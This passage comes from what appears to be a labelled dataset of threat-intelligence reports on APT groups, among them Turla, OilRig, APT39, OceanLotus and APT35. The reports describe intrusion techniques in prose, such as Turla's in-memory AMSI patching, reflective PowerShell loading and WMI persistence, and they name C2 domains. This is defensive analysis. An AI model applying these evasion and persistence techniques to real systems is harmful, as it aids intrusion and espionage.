to map the NULL page since Windows 8.While Buhtrap has always been known for its stealthy operations, in February 2016 their backdoor's source code which was used in previous attacks leaked online, leading to wide distribution among threat actors and subsequent adoption by various other groups and actors. However, as discovered by the ESET research team, the cyber-crime group moved on and added new tools to its toolkit and, as mentioned in the beginning, it also moved into cyber-espionage.“It is always difficult to attribute a campaign to a particular actor when their tools’ source code is freely available on the web,” says ESET. “However, as the shift in targets occurred before the source code leak, we assess with high confidence that the same people behind the first Buhtrap malware attacks against businesses and banks are also involved in targeting governmental institutions.” Also, “Although new tools have been added to their arsenal and updates applied to older ones, the tactics, techniques and procedures (TTPs) used in the different Buhtrap campaigns have not changed dramatically over all these years.” Even though the exact reason behind Buhtrap's decision to expand its operations into cyber-espionage is unknown, it is the perfect “example of the increasingly blurred lines between pure espionage groups and those primarily involved in crimeware activities.” A full list of indicators of compromise (IOCs) is available at the end of ESET's report on the Buhtrap group's move into cyber-espionage, including domains of C2 servers, malware sample hashes, codesigning certificate fingerprints, as well as a table of MITRE ATT&CK Techniques.\n\n\n",

        "explain": "The coronavirus (COVID-19) has become a global pandemic, and this is a golden time for attackers to take advantage of our collective fear to increase the likelihood of successful attack. True to form, they’ve been doing just that: performing spam and spear phishing campaigns using coronavirus as a lure for government and non-government entities. From late January on, several cybercriminal and state-sponsored advanced persistent threat (APT) groups have been using coronavirus-based phishing as their infection vector to gain a foothold on victim machines and launch malware attacks. Just like the spread of coronavirus itself, China was the first targeted by APT groups and as the virus spread worldwide, so did the attacks. In the following paper, we provide an overview of APT groups that have been using coronavirus as a lure, and we analyze their infection techniques and eventual payloads. We categorize the APT groups based on four different attack vectors used in COVID-19 campaigns: Template injection, Malicious macros, RTF exploits, and malicious LNK files.Template injection: Template injection refers to a technique in which the actors embed a script moniker in the lure document that contains a link to a malicious Office template in the XML setting. Upon opening the document, the remote template is dropped and executed. The Kimsuky and Gamaredon APTs used this technique. Malicious macros: Embedding malicious macros is the most popular method used by threat groups. In this technique, a macro is embedded in the lure document that will be activated upon opening. Konni (APT37), APT36, Patchwork, Hades, TA505, TA542, Bitter, APT32 (Ocean Lotus) and Kimsuky are the actors using this technique. RTF exploits: RTF is a flexible text format that allows embedding any object type within and makes RTF files vulnerable to many OLEl object-related vulnerabilities. Several Chinese threat actors use RTF files, among them the Calypso group and Winnti. Malicious LNK files: An LNK file is a shortcut file used by Microsoft Windows and is considered as a Shell item type that can be executed. Mustang Panda is a Chinese threat actor that uses this technique to drop either a variant of the PlugX RAT or Cobalt Strike into victims’ machines. Higaisia is a North Korean threat group that also uses this method. We expect that in the coming weeks and months, APT threat actors will continue to leverage this crisis to craft phishing campaigns using the techniques mentioned in the paper to compromise their targets. The Malwarebytes Threat Intelligence Team is monitoring the threat landscape and paying particular attention to attacks trying to abuse the public’s fear around the COVID-19 crisis. Our Malwarebytes consumer and business customers are protected against these attacks, thanks to our multi-layered detection engines.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "ESET researchers analyze new TTPs attributed to the Turla group that leverage PowerShell to run malware in-memory only Turla, also known as Snake, is an infamous espionage group recognized for its complex malware. To confound detection, its operators recently started using PowerShell scripts that provide direct, in-memory loading and execution of malware executables and libraries. This allows them to bypass detection that can trigger when a malicious executable is dropped on disk. Turla is believed to have been operating since at least 2008, when it successfully breached the US military. More recently, it was involved in major attacks against the German Foreign Office and the French military. This is not the first time Turla has used PowerShell in-memory loaders to increase its chances of bypassing security products. In 2018, Kaspersky Labs published a report that analyzed a Turla PowerShell loader that was based on the open-source project Posh-SecMod. However, it was quite buggy and often led to crashes. After a few months, Turla has improved these scripts and is now using them to load a wide range of custom malware from its traditional arsenal. The victims are quite usual for Turla. We identified several diplomatic entities in Eastern Europe that were compromised using these scripts. However, it is likely the same scripts are used more globally against many traditional Turla targets in Western Europe and the Middle East. Thus, this blogpost aims to help defenders counter these PowerShell scripts. We will also present various payloads, including an RPC-based backdoor and a backdoor leveraging OneDrive as its Command and Control (C&C) server. The PowerShell loader has three main steps: persistence, decryption and loading into memory of the embedded executable or library.The PowerShell scripts are not simple droppers; they persist on the system as they regularly load into memory only the embedded executables. We have seen Turla operators use two persistence methods:In the first case, attackers create two WMI event filters and two WMI event consumers. The consumers are simply command lines launching base64-encoded PowerShell commands that load a large PowerShell script stored in the Windows registry. Figure 1 shows how the persistence is established.These events will run respectively at 15:30:40 and when the system uptime is between 300 and 400 seconds. The variable $HL39fjh contains the base64-encoded PowerShell command shown in Figure 2. It reads the Windows Registry key where the encrypted payload is stored, and contains the password and the salt needed to decrypt the payload.Finally, the script stores the encrypted payload in the Windows registry. Note that the attackers seem to use a different registry location per organization. Thus, it is not a useful indicator to detect similar intrusions. A PowerShell profile is a script that runs when PowerShell starts. You can use the profile as a logon script to customize the environment. You can add commands, aliases, functions, variables, snap-ins, modules, and PowerShell drives.The payload stored in the Windows registry is another PowerShell script. It is generated using the open-source script Out-EncryptedScript.ps1 from the Penetration testing framework PowerSploit. In addition, the variable names are randomized to obfuscate the script, as shown in Figure 4. The payload is decrypted using the 3DES algorithm. The Initialization Vector, PINGQXOMQFTZGDZX in this example, is different for each sample. The key and the salt are also different for each script and are not stored in the script, but only in the WMI filter or in the profile.ps1 file.The payload decrypted at the previous step is a PowerShell reflective loader. It is based on the script Invoke-ReflectivePEInjection.ps1 from the same PowerSploit framework. The executable is hardcoded in the script and is loaded directly into the memory of a randomly chosen process that is already running on the system. In some samples, the attackers specify a list of executables that the binary should not be injected into, as shown in Figure 5. It is interesting to note that the names avp.exe, avpsus.exe, klnagent.exe and vapm.exe refer to Kaspersky Labs executables. It seems that Turla operators really want to avoid injecting their malware into Kaspersky software. In some samples deployed since March 2019, Turla developers modified their PowerShell scripts in order to bypass the Antimalware Scan Interface (AMSI). This is an interface allowing any Windows application to integrate with the installed antimalware product. It is particularly useful for PowerShell and macros.They did not find a new bypass but re-used a technique presented at Black Hat Asia 2018 in the talk The Rise and Fall of AMSI. It consists of the in-memory patching of the beginning of the function AmsiScanBuffer in the library amsi.dll. The PowerShell script loads a .NET executable to retrieve the address of AmsiScanBuffer. Then, it calls VirtualProtect to allow writing at the retrieved address. Finally, the patching is done directly in the PowerShell script as shown in Figure 6. It modifies the beginning of AmsiScanBuffer to always return 1 (AMSI_RESULT_NOT_DETECTED). Thus, the antimalware product will not receive the buffer, which prevents any scanning. The PowerShell scripts we have presented are generic components used to load various payloads, such as an RPC Backdoor and a PowerShell backdoor.Turla has developed a whole set of backdoors relying on the RPC protocol. These backdoors are used to perform lateral movement and take control of other machines in the local network without relying on an external C&C server. The features implemented are quite basic: file upload, file download and command execution via cmd.exe or PowerShell. However, the malware also supports the addition of plugins. This RPC backdoor is split into two components: a server and a client. An operator will use the client component to execute commands on another machine where the server component exists, as summarized in Figure 7. For instance, the sample identified by the following SHA-1 hash EC54EF8D79BF30B63C5249AF7A8A3C652595B923 is a client version. This component opens the named pipe \\pipe\\atctl with the protocol sequence being “ncacn_np” via the RpcStringBindingComposeW function. The sample can then send commands by calling the NdrClientCall2 function. The exported procedure HandlerW , responsible for parsing the arguments, shows that it is also possible to try to impersonate an anonymous token or try to steal another’s process token just for the execution of a command. Its server counterpart does the heavy lifting and implements the different commands. It first checks if the registry key value HKLM\\SYSTEM\\CurrentControlSet\\services\\LanmanServer\\Parameters\\NullSessionPipes contains “atctl”. If so, the server sets the security descriptor on the pipe object to “S:(ML;;NW;;;S-1-16-0)” via the SetSecurityInfo function. This will make the pipe available to everyone (untrusted/anonymous integrity level). The following image shows the corresponding MIDL stub descriptor and the similar syntax and interface ID. As mentioned previously, this backdoor also supports loading plugins. The server creates a thread that searches for files matching the following pattern lPH*.dll. If such a file exists, it is loaded and its export function ModuleStart is called. Among the various plugins we have located so far, one is able to steal recent files and files from USB thumb drives. Many variants of this RPC backdoor are used in the wild. Among some of them, we have seen local proxies (using upnprpc as the endpoint and ncalrpc as the protocol sequence) and newer versions embedding PowerShellRunner to run scripts directly without using powershell.exe. During our research, we also discovered a portable executable with the embedded pdb path C:\\Users\\Devel\\source\\repos\\RPCSpoofer\\x64\\Release_Win2016_10\\RPCSpoofServerInstall.pdb (SHA-1: 9D1C563E5228B2572F5CA14F0EC33CA0DEDA3D57). The main purpose of this utility is to retrieve the RPC configuration of a process that has registered an interface. In order to find that kind of process, it iterates through the TCP table (via the GetTcpTable2 function) until it either finds the PID of the process that has opened a specific port, or retrieves the PID of the process that has opened a specific named pipe. Once this PID is found, this utility reads the remote process’ memory and tries to retrieve the registered RPC interface. The code for this, seen in Figure 9, seems ripped from this Github repository.At first we were unsure how the retrieved information was used but then another sample, (SHA-1: B948E25D061039D64115CFDE74D2FF4372E83765) helped us understand. As shown in Figure 10, this sample retrieves the RPC interface, unsets the flag to RPC_IF_ALLOW_SECURE_ONLY, and patches the “dispatch table” in memory using the WriteProcessMemory function. Those operations would allow the sample to add its RPC functions to an already existing RPC interface. We believe it is stealthier to re-use an existing RPC interface than to create a custom one. PowerStallion is a lightweight PowerShell backdoor using Microsoft OneDrive, a storage service in the cloud, as C&C server. The credentials are hardcoded at the beginning of the script, as shown in Figure 11. It is interesting to note that Turla operators used the free email provider GMX again, as in the Outlook Backdoor and in LightNeuron. They also used the name of a real employee of the targeted organization in the email address. Then it uses a net use command to connect to the network drive. It then checks, in a loop, as shown in Figure 12, if a command is available. This backdoor can only execute additional PowerShell scripts. It writes the command results in another OneDrive subfolder and encrypts it with the XOR key 0xAA. Another interesting artefact is that the script modifies the modification, access and creation (MAC) times of the local log file to match the times of a legitimate file – desktop.ini in that example, as shown in Figure 13.We believe this backdoor is a recovery access tool in case the main Turla backdoors, such as Carbon or Gazer, are cleaned and operators can no longer access the compromised computers. We have seen operators use this backdoor for the following purposes:In a 2018 blogpost, we predicted that Turla would use more and more generic tools. This new research confirms our forecast and shows that the Turla group does not hesitate to use open-source pen-testing frameworks to conduct intrusion. However, it does not prevent attributing such attacks to Turla. Attackers tend to configure or modify those open-source tools to better suit their needs. Thus, it is still possible to separate different clusters of activities. Finally, the usage of open-source tools does not mean Turla has stopped using its custom tools. The payloads delivered by the PowerShell scripts, the RPC backdoor and PowerStallion, are actually very customized. Our recent analysis of Turla LightNeuron is additional proof that this group is still developing complex, custom malware. We will continue monitoring new Turla activities and will publish relevant information on our blog. For any inquiries, contact us as threatintel@eset.com. Indicators of Compromise can also be found on our GitHub.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "At the beginning of October 2020 we found copy of a malicious document potentially to be attributed to an APT group known with the name of APT34 / OilRig. The attribution, based on several elements found within the malicious document, was firstly reported by a security researcher through a social network. The above-mentioned document, which also had a name potentially compatible with the interests and objectives pursued by the threat actor in question, can be uniquely identified by the following indicators: According the extracted evidences, the author “signed” this malicious document leaving his/her username within the document metadata. This nickname was already widely known within the Cyber Threat Intelligence field because attributed to a member of the already mentioned threat group. Indeed this nickname is Iamfarhadzadeh, linked to Mohammad Farhadzadeh, believed to be a member of the hacking unit identified by the community as APT34 / OilRig. Considering this threat and proceeding further with our analysis we extracted several evidences that highlighted a connection with a common cyber-crime adversary. In particular the execution of the hidden macro permitted to download a copy of a malicious executable identified as a variant of AgentTesla that, to the best of our information, has no ties to the already reported threat actor. These evidences headed our research team to dig further in order to understand who was behind this campaign and why that nickname was left within the meta-content. Our first hypothesis was a deliberate attempt to deceive security researchers pushing them to attribute the malicious campaign to a cyber-espionage operation by releasing a malicious document linked to a socio-politic event.Our investigation covered a quite extended timeframe and permitted to continuously monitor the attackers activities and, with a wider point of view, what is lately happening within the cyber-crime panorama and how these cyber criminals act. To better clarify, we tracked and observed the use of tools to quickly create new phishing campaigns aimed to steal data and information that could be sold on the dark market or used to directly cause an economic loss to their victims. In details, the analyzed document, contains a hidden macro that through the subroutine auto_run runs automatically the obfuscated VBA code downloading a malicious payload from the following URL .to be later implanted within the victim’s temp folder. Following same evidences about the encoded URL as observed during the analysis the extracted payload matched exactly with AgentTesla payloads. This means that once executed the malware is able to record keystrokes, to collect user clipboard data, to get screenshots from the victim machine and to send all to the attacker command and control. The analysis gave us also the opportunity to establish an attacker “fingerprint”, to deeply track it, to study all its actions and to learn about tools and methods it used to start and deploy a new malware campaign and operations. We identified infected victims but also all information related the attacker’s host. We got evidences that the actor was likely a member of a cyber-crime team with a low knowledge about packers, evasion techniques and malware in general. Furthermore, we observed that he repeatedly executed his own malicious payloads over his machines from which the campaigns are operated. Among all data about the threat actor, we collected several IP addresses used by attacker as bridges in order to pack malicious documents and spread phishing waves. All of these servers are reachable via RDP services. A quite funny part of our investigation involved also evidences about Skype and ICQ accounts of the crew that are currently used for sharing and exchanging compromised assets and emails with other cyber-criminals. It is interesting to note that, during the preparation phases of the campaigns, the threat actor seemed to act by choosing potential targets on the basis of very specific address lists, probably cataloged on the basis of the sector of interest. For example, while preparing campaigns aimed at compromising entities operating in Oil&Gas sector, the collected evidences suggest a web browsing activity performed by the adversary towards websites dedicated to news about industrial groups operating in this sector. One of these websites, which cybercriminals rely on to acquire information about the Oil&Gas industry, is ognnews.com, showed within the screenshot reported here below:In other cases members of the crew search directly in darkweb websites dedicated to the provision of phishing kits and lists of email addresses to be included among potential targets. We tracked at least 8 different underground forums consulted by the group for purchasing compromised assets and get tools to obfuscate malware. In particular, threat actor seems to prefer buy and use a malware core which can be referred to as OriginLogger. OriginLogger in conjunction with the use of an online PE crypter, called Cassandra, generates malicious payloads internally matching AgentTesla's signatures. Furthermore, in order to have a clearer view about the spread of the threat, an ad-hoc signature has been internally created for the malware family in question, starting from the sample identified by the following hash: This signature made it possible to obtain a good level of detection with a low false positive rate. As the image below reports, starting from the second week of October 2020, the group began to heavily spread “OriginLogger plus Cassandra” payloads, internally reaching a number of unique detections exceeding the 500 hits from mid-October until dropping around only 10 to December 1, 2020 (this is probably as a consequence of the increase in the global detection rates of the variants in question).Threat actor targeted many entities and organizations across different industrialized countries, including Italy. The operations involved as well many individual users. We counted around at least 300 Italian email addresses as targets of phishing campaigns operated by this adversary from mid-October 2020. Among the most impacted sectors we observed industry, manufacturing, transports, energy and oil&gas. According to the collected evidences below are reported details about to the countries where victims of these phishing campaigns are located: Our internal Threat Intelligence Research Team links the threat actor in question with a criminally-motivated organization operating from Nigeria. The techniques, tactics and procedures observed overlaps with a threat actor described in a research paper by NTT, dated October 2020, available at URL https://hello.global.ntt/-/media/ntt/global/insights/gtic-monthly-threat-report/gtic-monthly-threat-report-october-2020.pdf In this paper, NTT researchers described malicious campaigns and BEC operations perpetrated by an actor operating from Nigeria, they named OZIE Team. As many of the characteristics of the adversary we tracked overlap with what is reported in the aforementioned document, we assert, with a medium degree of confidence, that the threat actor in question is part of or is potentially close to the OZIE gang.Telsy internal research team has been supported by the collaboration of several independent security researchers during the acquisition and analysis phases of parts of the artifacts and evidences collected. Among these we thank Vito Alfano (@vxsh4d0w) for his precious support and collaboration.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "The UK National Cyber Security Centre (NCSC) and Microsoft reported that the Russia-linked APT group Callisto Group is targeting organizations worldwide. The nation-state actor is carrying out spear-phishing attacks for cyberespionage purposes. The Callisto APT group (aka “Seaborgium“, “Star Blizzard”, “ColdRiver”, “TA446”) targeted government officials, military personnel, journalists and think tanks since at least 2015.In the past, the group’s activity involved persistent phishing and credential theft campaigns leading to intrusions and data theft. The APT primarily targets NATO countries, but experts also observed campaigns targeting the Baltics, Nordics, and Eastern Europe regions, including Ukraine. This week, the Reddit security team attributed the leak of US-UK trade documents through its platform to a coordinated information campaign linked to Russia. “We were recently made aware of a post on Reddit that included leaked documents from the UK,” the statement said. “We investigated this account and the accounts connected to it, and today we believe this was part of a campaign that has been reported as originating from Russia.” “Earlier this year Facebook discovered a Russian campaign on its platform, which was further analyzed by the Atlantic Council and dubbed ‘Secondary Infektion,’” Reddit’s announcement said. “Suspect accounts on Reddit were recently reported to us, along with indicators from law enforcement, and we were able to confirm that they did indeed show a pattern of coordination.” According to a press release published by the UK government, the UK and its allies observed a series of attempts by the Russian Intelligence Services to target high-profile individuals and entities through cyber operations. The nation-state actor aimed at obtaining information to interfere in UK politics and democratic processes. The UK Government linked the activity to Centre 18, a unit within Russia’s Intelligence Services FSB tracked as Star Blizzard. “While some attacks resulted in documents being leaked, attempts to interfere with UK politics and democracy have not been successful.” reads the press release. ” The group has also selectively leaked and amplified the release of information in line with Russian confrontation goals, including to undermine trust in politics in the UK and likeminded states.” The UK believes that the FSB coordinated at least the following activities: Cyber attacks against parliamentarians from multiple political parties since at least 2015. The theft of UK-US trade documents leaked before the 2019 General Election. The leak was previously attributed to the Russian state via a Written Ministerial Statement in 2020. The 2018 hack of the Institute for Statecraft, a UK think tank engaged in initiatives to safeguard democracy against disinformation. The state-sponsored hackers gained access to the account of its founder Christopher Donnelly from December 2021. Attacks against universities, journalists, the public sector, non-governmental organizations, and other civil society organizations, many of which play a crucial role in UK democracy. The National Crime Agency investigation identifies two members of Star Blizzard and the UK and US governments sanctioned them. The two individuals are: Ruslan Aleksandrovich PERETYATKO, who is a Russian FSB intelligence officer and a member of Star Blizzard AKA the Callisto Group Andrey Stanislavovich KORINETS, AKA Alexey DOGUZHIEV, who is a member of Star Blizzard AKA the Callisto Group “The Foreign, Commonwealth and Development Office has also summoned the Russian Ambassador to express the UK’s deep concern about Russia’s sustained attempts to use cyber to interfere in political and democratic processes in the UK and beyond.” concludes the press release. The Microsoft Threat Intelligence team also provided technical details about Star Blizzard tactics, techniques, and procedures (TTPs). The operations of Star Blizzard continue to concentrate on the theft of email credentials, with a primary emphasis on targeting cloud-based email providers hosting both organizational and personal email accounts.Microsoft has identified five new Callisto Group (Star Blizzard) evasive techniques: Use of server-side scripts to prevent automated scanning of actor-controlled infrastructure. Use of email marketing platform services to hide true email sender addresses and obviate the need for including actor-controlled domain infrastructure in email messages Use of a DNS provider to obscure the IP addresses of actor-controlled virtual private server (VPS) infrastructure. Once notified, the DNS provider took action to mitigate actor-controlled domains abusing their service. Password-protected PDF lures or links to cloud-based file-sharing platforms where PDF lures are hosted Shifting to a more randomized domain generation algorithm (DGA) for actor-registered domains.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "In December 2018, FireEye identified APT39 as an Iranian cyber espionage group responsible for widespread theft of personal information. We have tracked activity linked to this group since November 2014 in order to protect organizations from APT39 activity to date. APT39’s focus on the widespread theft of personal information sets it apart from other Iranian groups FireEye tracks, which have been linked to influence operations, disruptive attacks, and other threats. APT39 likely focuses on personal information to support monitoring, tracking, or surveillance operations that serve Iran’s national priorities, or potentially to create additional accesses and vectors to facilitate future campaigns. APT39 was created to bring together previous activities and methods used by this actor, and its activities largely align with a group publicly referred to as “Chafer.” However, there are differences in what has been publicly reported due to the variances in how organizations track activity. APT39 primarily leverages the SEAWEED and CACHEMONEY backdoors along with a specific variant of the POWBAT backdoor. While APT39's targeting scope is global, its activities are concentrated in the Middle East. APT39 has prioritized the telecommunications sector, with additional targeting of the travel industry and IT firms that support it and the high-tech industry. The countries and industries targeted by APT39 are depicted in Figure 1. Operational Intent APT39's focus on the telecommunications and travel industries suggests intent to perform monitoring, tracking, or surveillance operations against specific individuals, collect proprietary or customer data for commercial or operational purposes that serve strategic requirements related to national priorities, or create additional accesses and vectors to facilitate future campaigns. Government entities targeting suggests a potential secondary intent to collect geopolitical data that may benefit nation-state decision making. Targeting data supports the belief that APT39's key mission is to track or monitor targets of interest, collect personal information, including travel itineraries, and gather customer data from telecommunications firms. We have moderate confidence APT39 operations are conducted in support of Iranian national interests based on regional targeting patterns focused in the Middle East, infrastructure, timing, and similarities to APT34, a group that loosely aligns with activity publicly reported as “OilRig”. While APT39 and APT34 share some similarities, including malware distribution methods, POWBAT backdoor use, infrastructure nomenclature, and targeting overlaps, we consider APT39 to be distinct from APT34 given its use of a different POWBAT variant. It is possible that these groups work together or share resources at some level. APT39 uses a variety of custom and publicly available malware and tools at all stages of the attack lifecycle. For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection. APT39 frequently registers and leverages domains that masquerade as legitimate web services and organizations that are relevant to the intended target. Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources. Establish Foothold, Escalate Privileges, and Internal Reconnaissance Post-compromise, APT39 leverages custom backdoors such as SEAWEED, CACHEMONEY, and a unique variant of POWBAT to establish a foothold in a target environment. During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump. Internal reconnaissance has been performed using custom scripts and both freely available and custom tools such as the port scanner, BLUETORCH. Lateral Movement, Maintain Presence, and Complete Mission APT39 facilitates lateral movement through myriad tools such as Remote Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom, and xCmdSvc. Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts. In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment. To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip. There are some indications that APT39 demonstrated a penchant for operational security to bypass detection efforts by network defenders, including the use of a modified version of Mimikatz that was repacked to thwart anti-virus detection in one case, as well as another instance when after gaining initial access APT39 performed credential harvesting outside of a compromised entity's environment to avoid detection.We believe APT39's significant targeting of the telecommunications and travel industries reflects efforts to collect personal information on targets of interest and customer data for the purposes of surveillance to facilitate future operations. Telecommunications firms are attractive targets given that they store large amounts of personal and customer information, provide access to critical infrastructure used for communications, and enable access to a wide range of potential targets across multiple verticals. APT39's targeting not only represents a threat to known targeted industries, but it extends to these organizations' clientele, which includes a wide variety of sectors and individuals on a global scale. APT39's activity showcases Iran's potential global operational reach and how it uses cyber operations as a low-cost and effective tool to facilitate the collection of key data on perceived national security threats and gain advantages against regional and global rivals.\n\n\n",

Previously, Antiy and other security vendors have published a number of analysis reports on OceanLotus, focusing mainly on the PC side. The attack methods are mainly based on spear and phishing attacks, and mobile attacks are rare. However, with the development of the mobile Internet, on the one hand, people’s mobile phones gradually become dual-use. In addition to the personal privacy of users, they often have their social attributes. On the other hand, wireless communication of smartphones can bypass the internal safety regulation devices, so the attack on the mobile side has become an important part of the entire attack chain. Below, Antiy Mobile Security use the mobile-side attack incidents that occurred in China as a blueprint for specific analysis and explanation. These applications disguise as a normal application, and their icons will hide automatically after they are running. They will release malicious sub-packages in the background, receive the remote control command, steal the privacy information of users such as SMS messages, contacts, call records, geographic locations, and browser records. They also download apks secretly and record audios and videos, then upload users’ privacy information to server, causing users’ privacy leakage.The main package reflects the Execute method of the com.android.preferences.AndroidR class: Set up communication with mobile phone, send control instructions and upload some private information such as SMS, contact, call record, geographical location and browser record. In addition, the spy sub-package also established https communication for uploading large files such as recordings, screenshots, documents, photos, videos.https://jang.goongnam.com/resource/request.php, it has been inactivated at present, and the C2 belongs to the assets of the OceanLotus organization. As shown in the following figure: First, the signature Subject contains the words HackingTeam and Christian Pozz (the name of an administrator in the Hacking Team); secondly, the registration function in the code can be considered as commercial spyware for sale; finally, according to the late Hacking According to Team’s leaked information, the country OceanLotus affiliated with is also on the list of its customers. Different from the samples we analyzed before, the above samples have obvious functional improvements, and the privilege escalation has been added. Taking 45AE1CB1596E538220CA99B29816304F as an example, the file named dataOff.db in the assets directory is decrypted, and the file after decryption has the privilege escalation. The configuration file looks like this: It can be seen that after the code leakage, the CEO of the HackingTeam organization said that “the leaked code is only a small part” is based on the facts, which also reflects that the network arms merchants have lowered the threshold of APT attacks to a certain extent, making more uncertainties of cyber attacks. At the same time, we also noticed that the series of malicious code has been delivered through the domestic third-party application market and file sharing website. The OceanLotus is always evolving and constantly updating its attack techniques and arsenal to achieve the goal of bypassing security software. In addition to the constant updating of the arsenal, the organization is quite knowledgeable about China, including the policies and usage habits. This not only confuses the relevant personnel, increases the success rate of their attacks, but also brings immeasurable losses to the target victim groups. Therefore, for individuals, it is necessary to effectively raise the awareness of network security and not be blinded by phishing information. For security vendors, it is more necessary to deepen their understanding and continue to conduct targeted confrontation and improve security protection capabilities, truly escort for mobile security of the user side.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "APT35, sometimes referred to as Charming Kitten, Imperial Kitten, or Tortoiseshell, is a notorious cyber-espionage group which has been active for nearly 10 years. Famous for stealing scripts from HBO’s Game of Thrones in 2017 and suspected of interfering in the U.S. presidential election last year, it has launched extensive campaigns against organizations and officials across North America and the Middle East. Public attribution has associated APT35 with an Iran-based nation state threat actor. Darktrace regularly detects attacks by many known threat actors including Evil Corp and APT41, alongside large amounts of malicious but uncategorized activity from sophisticated attack groups. As Cyber AI doesn’t rely on pre-defined rules, signatures, or threat intelligence to detect cyber-attacks, it often detects new and previously unknown threats. This blog post examines a real-world instance of APT35 activity in an organization in the EMEA region. Darktrace observed this activity last June, but due to ongoing investigations, details are only now being released with the wider community. It represents an interesting case for the value of self-learning AI in two key ways:Identifying ‘low and slow’ attacks: How do you spot an attacker that is lying low and conducts very little detectable activity? Detecting pre-existing infections without signatures: What if a threat actor is already inside the system when Cyber AI is activated?APT35 had already infected a single corporate device, likely via a spear phishing email, when Cyber AI was deployed in the company’s digital estate for the first time. The infected device exhibited no other signs of malicious activity beyond continued command and control (C2) beaconing, awaiting instructions from the attackers for several days. This is what we call ‘lying low’ – where the hacker stays present within a system, but remains under the radar, avoiding detection either intentionally, or because they’re focusing on another victim while being content with backdoor access into the organization. Either way, this is a nightmare scenario for a security team and any security vendor: an APT which has established a foothold and is lying in wait to continue their attack – undetected.When Darktrace’s AI was first activated, it spent five business days learning the unique ‘patterns of life’ for the organization. After this initial, short learning period, Darktrace immediately flagged the infected device and the C2 activity. Although the breach device had been beaconing since before Darktrace was implemented, Cyber AI automatically clusters devices into ‘peer groups’ based on similar behavioral patterns, enabling Darktrace to identify the continued C2 traffic coming from the device as highly unusual in comparison to the wider, automatically identified peer group. None of its behaviorally close neighbors were doing anything remotely similar, and Darktrace was therefore able to determine that the activity was malicious, and that it represented C2 beaconing. Darktrace detected the APT35 C2 activity without the use of any signatures or threat intelligence on multiple levels. Responding to the alerts, the internal security team quickly isolated the device and verified with the Darktrace system that no further reconnaissance, lateral movement, or data exfiltration had taken place.Once the C2 was detected, Cyber AI Analyst immediately began analyzing the infected device. The Cyber AI Analyst only highlights the most severe incidents in any given environment and automates many of the typical level one and level two SOC tasks. This includes reviewing all alerts, investigating the scope and nature of each event, and reducing time to triage by 92%.Numerous factors made the C2 activity stand out strongly to Darktrace. Combining all those small anomalies, Darktrace was able to autonomously prioritize this behavior and classify it as the most significant security incident in the week.Some of the command and control destinations were known to threat intelligence and open-source intelligence (OSINT) – for instance, the domain cortanaservice[.]com is a known C2 domain for APT35. However, the presence of a known malicious domain does not guarantee detection. In fact, the organization had a very mature security stack, yet they failed to discover the existing APT35 infection until Darktrace was activated in their environment.Once an intrusion has been identified, it is important to understand the extent of it – such as whether lateral movement is occurring and what connectivity the infected device has in general. Asset management is never perfect, so it can be very hard for organizations to determine what damage a compromised device is capable of inflicting. Darktrace presents this information in real time, and from a bird’s-eye perspective, making the assessment very simple. It immediately highlights which subnet the device is located in and any further context.Based on this information, the organization confirmed that it was a corporate device that had been infected by APT35. As Darktrace shows any credentials associated with the device, a quick assessment could be made of potentially compromised accounts.Luckily, only a single local user account was associated with the device. The exact level of privileges and connectivity which the infected device had, as well as the extent to which the intrusion might have spread from the initially infected device, was still uncertain. By looking at the device’s event log, this became rapidly clear within minutes. Filtering first for internal connections only (excluding any connections going to the Internet) gave a good idea of the level of connectivity of the device. A cursory glance showed that the device did indeed have some level of internal connectivity. It made DNS requests to the internal domain controller and was making successful NetBIOS connections over ports 135 and 139 internally. By filtering further in the event log, it quickly became clear that in this time the device had not used any administrative channels, such as RDP, SSH, Telnet, or SMB. This is a strong indicator that no lateral movement over common channels had taken place. It is more difficult to assess whether the device was performing any other suspicious activity, like stealthy reconnaissance or staging data from other internal devices. Darktrace provided another capability to assess this quickly – filtering the device’s network connections to show only unusual or new connections.Darktrace assesses each individual connection for every entity observed in context, using its unsupervised machine learning to evaluate how unusual a given connection is. This could be a single new failed internal connection attempt, indicating stealthy reconnaissance, or a connection over SMB at an unusual time to a new internal destination, implying lateral movement or data staging. By filtering for only unusual or new connections, Darktrace’s AI produces further leads that can be pursued extremely quickly, thanks to the context and added visibility. No further suspicious internal connections were observed, strengthening the hypothesis that APT35 was lying low at that time.Darktrace’s 24/7 monitoring service, Proactive Threat Notifications, would have alerted on and escalated the incident. Darktrace RESPOND would have responded autonomously and enforced normal activity for the device, preventing the C2 traffic without interrupting regular business workflows. It is impossible to predefine where the next attack will come from. APT35 is just one of the many sophisticated threat actors on the scene, and with such a diverse and volatile threat landscape, unsupervised machine learning is crucial in spotting and defending against anomalies, no matter what form they take. This case study helps illustrate how Darktrace detects pre-existing infections and ‘low and slow’ attacks, and further shows how Darktrace can be used to quickly understand the scope and extent of an intrusion.\n\n\n",

